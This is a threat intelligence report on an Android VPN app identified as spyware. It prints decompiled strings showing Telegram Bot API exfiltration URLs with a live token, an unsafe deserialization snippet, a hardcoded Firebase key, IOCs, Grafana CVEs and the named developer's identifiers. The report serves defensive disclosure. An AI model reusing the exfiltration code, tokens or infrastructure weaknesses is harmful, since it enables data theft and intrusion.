---
layout: single
title: "Threat Intelligence Report: Premium VPN Android — Confirmed Spyware with Active Data Exfiltration"
date: 2026-02-22
categories: [threat-intelligence]
tags: [Spyware, Android, Flutter, VPN, DataExfiltration, Attribution, Telegram, ReverseEngineering]
author_profile: true
---

<span style="background-color:#28a745;color:white;padding:4px 10px;border-radius:4px;font-weight:bold;">TLP:CLEAR</span> — This report may be freely shared without restriction.

---

## Report Metadata

| Field | Details |
|-------|---------|
| **Report ID** | SDI-2026-001 |
| **Date** | February 22, 2026 |
| **Analyst** | Sam Dalgleish (CyberFrenchie) |
| **Threat Category** | Spyware / Malicious Mobile Application |
| **Target Application** | Premium VPN — `com.premium_vpn.mobile` v1.5.5 (build 2026020601) |
| **Platform** | Android (Flutter/Dart AOT + sing-box VPN engine) |
| **Confidence Level** | **High** |
| **Classification** | TLP:CLEAR |

---

## 1. Executive Summary

**Premium VPN** is a Flutter-based Android VPN application distributed on the Google Play Store. This investigation — conducted through static reverse engineering of the compiled Dart AOT binary using Blutter, OSINT reconnaissance, and live Telegram Bot API verification — confirms that the application is **spyware masquerading as a privacy tool**.

The app contains a hardcoded Telegram Bot API token that actively exfiltrates device logs and fingerprinting data to a private Telegram group. The sole administrator of that group has been **fully identified** as **Рамзиль Галимов (Ramzil Galimov)**, a Russian developer, confirmed across three independent sources.

Critically, the app's own VPN tunnel **deliberately excludes the operator's traffic** from encryption, meaning the user's real IP address is always visible to the operator — directly contradicting the product's privacy claims.

**Overall Assessment: CRITICAL — Active spyware. Uninstall immediately.**

---

## 2. Operator Attribution

The developer's identity was confirmed through three independent sources with no ambiguity.

| Source | Evidence |
|--------|----------|
| **Dart AOT binary** (`libapp.so`) | Build filesystem path: `file:///Users/ramzilgalimov/Desktop/Work/premium_vpn_flavors/premium_vpn/` |
| **Telegram Bot API** (`getMe`) | Bot: `Premium VPN LOGS` — `@premium_vpn_logs_bot` — confirmed active |
| **Telegram Bot API** (`getChatAdministrators`) | Creator: **Рамзиль Галимов** (`@Ramsy_r`, ID: `363585796`) — sole recipient of all exfiltrated data |

### Identified Operator

| Field | Value |
|-------|-------|
| **Full Name** | Рамзиль Галимов (Ramzil Galimov) |
| **Telegram Username** | @Ramsy_r |
| **Telegram User ID** | `363585796` |
| **Language** | Russian (`ru`) |
| **Telegram Premium** | Yes |
| **macOS Username** | `ramzilgalimov` |
| **Project Path** | `~/Desktop/Work/premium_vpn_flavors/premium_vpn/` |
| **Role** | Sole creator of exfiltration group — personally receives all stolen user data |

### Exfiltration Group

| Field | Value |
|-------|-------|
| **Group Name** | `Premium VPN LOGS` |
| **Group ID** | `-5133544759` |
| **Type** | Private group |
| **Members** | **2** — the exfiltration bot and Ramzil Galimov only |
| **All Members Admins** | Yes |

Every device fingerprint, VPN log, and installation event collected from users worldwide is sent directly to a private 2-member Telegram group controlled solely by the developer.

---

## 3. Indicators of Compromise (IOCs)

| Indicator | Type | Description |
|-----------|------|-------------|
| `com.premium_vpn.mobile` | App Package | Malicious Android application |
| `34.141.12.169` | IP Address | Primary API / Grafana — Google Cloud |
| `193.247.82.80` | IP Address | Self-hosted Sentry (`s.hifixie.com`) |
| `85.198.100.136` | IP Address | Reserve API (`rapi.hifixie.com`) |
| `176.57.65.215` | IP Address | Russian-hosted website (`vpn-client-premium.ru`) |
| `176.57.67.49` | IP Address | Russian-hosted key store (`premium-vpn.store`) |
| `34.132.64.158` | IP Address | Secondary website (`premium-web.info`) |
| `hifixie.com` | Domain | Operator API domain |
| `vpn-client-premium.ru` | Domain | Russian-hosted operator website |
| `premium-web.info` | Domain | Secondary operator brand |
| `premium-vpn.store` | Domain | VPN key store |
| `@premium_vpn_logs_bot` | Telegram Bot | **Active data exfiltration bot** |
| `7969799253` | Telegram Bot ID | Exfiltration bot ID |
| `-5133544759` | Telegram Group ID | Private exfiltration group |
| `363585796` | Telegram User ID | Operator (Ramzil Galimov / @Ramsy_r) |
| `AIzaSyBY9_oiHWQ1sMgVGF1T2QFBCloWEi120JY` | Firebase API Key | Hardcoded in binary |

---

## 4. Findings Summary

| # | Severity | Finding |
|---|----------|---------|
| 1 | **CRITICAL** | Hardcoded Telegram Bot token — active log/file exfiltration to identified operator |
| 2 | **CRITICAL** | VPN bypass rules exclude operator's own domains from the tunnel |
| 3 | **HIGH** | Unsafe Java object deserialization — potential RCE |
| 4 | **HIGH** | App install monitoring via `PACKAGE_ADDED` broadcast receiver |
| 5 | **HIGH** | UDID-based persistent device fingerprinting with Telegram exfiltration |
| 6 | **HIGH** | Unauthenticated API exposes full VPN configuration |
| 7 | **HIGH** | Grafana 11.1.1 exposed — 4 known CVEs including CVSS 9.9 RCE |
| 8 | **HIGH** | Real IP and geolocation harvesting via multiple services |
| 9 | **MEDIUM** | Hardcoded Firebase API key |
| 10 | **MEDIUM** | Two Sentry DSNs exposed (self-hosted) |
| 11 | **MEDIUM** | Advertising ID permission on a claimed privacy tool |

---

## 5. Detailed Findings

### Finding 1: Active Data Exfiltration via Hardcoded Telegram Bot Token

**Severity:** CRITICAL
**CWE:** CWE-798 (Hard-coded Credentials), CWE-200 (Exposure of Sensitive Information)
**Method:** Blutter Dart AOT decompilation of `libapp.so`

The compiled Dart binary contains a hardcoded Telegram Bot API token and `chat_id`, recovered directly from the object pool:

```
[pp+0x1200] "https://api.telegram.org/bot7969799253:AAEoOLQQMBVLkNUKWRuVGaiNELwEPTQi9uk/sendDocument"
[pp+0x48c0] "https://api.telegram.org/bot7969799253:AAEoOLQQMBVLkNUKWRuVGaiNELwEPTQi9uk/sendMessage"
[pp+0x11d0] "-5133544759"   ← destination group ID
[pp+0x4878] "*UDID*: `"
[pp+0x4888] "*App Version*: `"
```

The exfiltration service (`SendLogsService::sendFullLogs`, decompiled at `0x62c0e0`) operates as follows:

1. Checks how many times logs have been sent today via `SharedPreferences`
2. **Rate-limits to 10 sends per day** — deliberate throttling to avoid detection
3. Collects all log files from the app's data directory
4. Sends each file as a Telegram document via `/sendDocument`
5. Sends a device fingerprint message via `/sendMessage` in MarkdownV2 format

**Files exfiltrated per session:**

| File | Contents |
|------|----------|
| `box.log` | VPN engine logs — connections, servers, errors |
| `flutter_logs.log` | Flutter runtime logs |
| `logs.log` | General application logs |
| `native_logs.log` | Native layer logs |
| `stderr.log` / `stderr2.log` | Error output |

**Device fingerprint fields exfiltrated:** `UDID`, `brand`, `model`, `device`, `androidVersion`, `androidSdkInt`, `ramSize`

The hardcoded bot token was verified live against the Telegram Bot API, confirming the bot is **active**. Every send goes directly to a private 2-member group administered solely by the identified developer.

---

### Finding 2: VPN Bypass Rules — Operator Traffic Excluded from Tunnel

**Severity:** CRITICAL
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)

The sing-box VPN configuration — returned by the unauthenticated `/api/v1/app/settings` endpoint — contains explicit bypass rules:

```json
"rules": [
  {"domains": "domain:hifixie.com", "outbound": "bypass"},
  {"domains": "domain:app-measurement.com", "outbound": "bypass"}
]
```

All traffic to `hifixie.com` (the operator's API) and `app-measurement.com` (Google Analytics) **travels outside the VPN tunnel on the user's real IP**. This means:

- All auth tokens, UDID headers, and device data sent to the operator's API are unencrypted to the user's ISP
- Google Analytics tracking bypasses the tunnel
- The operator **always knows the user's real IP** — the VPN provides no privacy from the operator at all

This is not a configuration error. The rules are deliberate.

---

### Finding 3: Unsafe Java Object Deserialization (RCE)

**Severity:** HIGH
**CWE:** CWE-502
**Location:** `VPNService.java:230–235`

```java
Object object = new ObjectInputStream(
    new ByteArrayInputStream(Base64.decode(strSubstring, 0))
).readObject();
```

The VPN service deserializes arbitrary Java objects from Base64-encoded data stored in `SharedPreferences`. An attacker with write access to `SharedPreferences` (via a co-installed malicious app or backup abuse) could achieve arbitrary code execution.

---

### Finding 4: App Install Monitoring

**Severity:** HIGH
**CWE:** CWE-359
**Location:** `Application.java:36–40`

```java
intentFilter.addAction("android.intent.action.PACKAGE_ADDED");
intentFilter.addDataScheme("package");
registerReceiver(aVar, intentFilter);
```

The app registers a broadcast receiver for every application installed on the device. There is no legitimate VPN functionality that requires monitoring app installations.

---

### Finding 5: UDID Device Fingerprinting with Telegram Exfiltration

**Severity:** HIGH
**CWE:** CWE-359

A persistent device identifier (UDID) is generated via `FlutterUdid` and used in two ways:

1. **Injected into every HTTP request** — `UdidInterceptor` (decompiled at `0x894380`) adds a `unique-device-id` header to all API calls, allowing the operator to track the device across sessions
2. **Sent to Telegram** — `SendLogsService::_sendDeviceInfoMessage()` formats the UDID in MarkdownV2 and sends it directly to the operator's private group

```
r0 = getUDID()           ; LocalStorage::getUDID
r2 = "unique-device-id"  ; Header injected into every request
```

---

### Finding 6: Unauthenticated API Configuration Dump

**Severity:** HIGH
**CWE:** CWE-200

`/api/v1/app/settings` returns the complete application configuration with no authentication required, including the full VPN routing rules, infrastructure domains, support bot usernames, Google Cloud Storage bucket paths, and bypass rules (Finding 2).

---

### Finding 7: Grafana 11.1.1 — 4 Known CVEs Including Critical RCE

**Severity:** HIGH

Discovered via TLS certificate SAN on `api.hifixie.com`:
```
DNS:api.hifixie.com, DNS:grafana.hifixie.com
```

| Detail | Value |
|--------|-------|
| URL | `grafana.hifixie.com` |
| IP | `34.141.12.169` (Google Cloud) |
| Version | **Grafana 11.1.1** |

| CVE | CVSS | Type |
|-----|------|------|
| CVE-2024-9264 | **9.9 Critical** | RCE via DuckDB SQL injection |
| CVE-2025-2703 | 6.8 Medium | Cross-Site Scripting |
| CVE-2025-61725 | Medium | Information Exposure |
| CVE-2024-8118 | Medium | Permissions Bypass in Alerting |

---

### Finding 8: Real IP and Geolocation Harvesting

**Severity:** HIGH
**CWE:** CWE-359

The decompiled `IpInfoService` queries multiple services to obtain the user's real IP and physical location, all of which **bypass the VPN tunnel** due to Finding 2:

```
https://ipinfo.io/json         — Returns IP, city, region, country, lat/long
https://checkip.amazonaws.com  — Fallback
https://icanhazip.com          — Fallback
https://ident.me               — Fallback
```

Fields captured include `latitude`, `longitude`, and `X-REAL-IP`. The operator receives the user's precise geolocation even while the VPN is active.

---

## 6. Infrastructure Map

| Asset | IP | Hosting | Status |
|-------|----|---------|--------|
| `api.hifixie.com` | `34.141.12.169` | Google Cloud (EU) | Live |
| `grafana.hifixie.com` | `34.141.12.169` | Google Cloud (EU) | Exposed — login required |
| `s.hifixie.com` | `193.247.82.80` | Unknown | Self-hosted Sentry |
| `rapi.hifixie.com` | `85.198.100.136` | Unknown | Reserve API — Live |
| `vpn-client-premium.ru` | `176.57.65.215` | **Russian hosting** | Live |
| `premium-vpn.store` | `176.57.67.49` | **Russian hosting** | Live |
| `premium-web.info` | `34.132.64.158` | Google Cloud | Live |
| `@premium_vpn_logs_bot` | — | Telegram | **Active exfiltration** |

**Note:** Two operator-controlled brands (`vpn-client-premium.ru` and `premium-web.info`) are served by the same backend infrastructure, suggesting a multi-brand distribution strategy.

---

## 7. Attribution Assessment

| Assessment | Confidence |
|------------|------------|
| `com.premium_vpn.mobile` is active spyware | **High** — live bot verification confirms exfiltration |
| Developer is Рамзиль Галимов (@Ramsy_r) | **High** — confirmed across Dart binary, Telegram Bot API (3 endpoints) |
| Exfiltration is intentional, not accidental | **High** — rate limiting, MarkdownV2 formatting, and bypass rules are deliberate design decisions |
| Russian infrastructure used to reduce legal exposure | **Medium** — two domains on Russian hosting, Russian language throughout |

---

## 8. Recommended Actions

**For users:**
- **Uninstall immediately** — `com.premium_vpn.mobile`
- Assume device fingerprint (UDID, brand, model, Android version, RAM), VPN logs, and real IP have been exfiltrated
- Review recently installed apps for any monitoring via `PACKAGE_ADDED`

**For defenders:**
- Block all IOC IPs and domains at perimeter
- Alert on outbound Telegram Bot API connections (`api.telegram.org`) from mobile devices
- Flag `unique-device-id` header in proxy/DLP logs

**Disclosure:**
- Google Play — report `com.premium_vpn.mobile` for policy violation (spyware)
- Google Cloud abuse — report `34.141.12.169` and `34.132.64.158`
- Telegram — report bot `@premium_vpn_logs_bot` and group `-5133544759`

---

## 9. Methodology

| Phase | Method | Tools |
|-------|--------|-------|
| Static analysis | Dart AOT decompilation | Blutter, jadx |
| IOC extraction | Object pool and string recovery | Blutter (`pp.txt`, `objs.txt`) |
| Live verification | Telegram Bot API calls | Direct HTTP (hardcoded token) |
| Infrastructure | Domain/IP enumeration | TLS certificate SAN, Shodan |
| Attribution | Cross-source correlation | Dart binary + Telegram API |

Blutter successfully decompiled the Dart AOT snapshot (`libapp.so`, 9.8MB, Dart 3.10.7), producing 59,576 lines of class/method pool data, 36,310 object pool entries, and 97 assembly files with decompiled pseudo-code.

---

## 10. Confidence Assessment

**Overall Confidence: High**

Attribution and exfiltration findings are corroborated across multiple independent sources: the compiled binary (build path), the Telegram Bot API (`getMe`, `getChat`, `getChatAdministrators`, `getMyShortDescription`), and the live unauthenticated settings API. The exfiltration bot was verified active at the time of analysis. Confidence is not assessed as definitive only because the rate-limited exfiltration mechanism could not be directly observed in transit.

---

---

## Responsible Disclosure

| Date | Action |
|------|--------|
| 2026-02-22 | Analysis completed and findings documented |
| 2026-02-22 | Reported to Google Play via the in-app report mechanism |
| 2026-03-09 | Report published — no response received from Google at time of publication |

This report is published in the public interest. The application is available on the Google Play Store and is actively exfiltrating user data. Users have a right to know.

---

*SDI-2026-001 — Sam Dalgleish (CyberFrenchie) — February 22, 2026*
*Research conducted for educational and public interest purposes. All analysis performed on a publicly distributed application using open-source tools.*
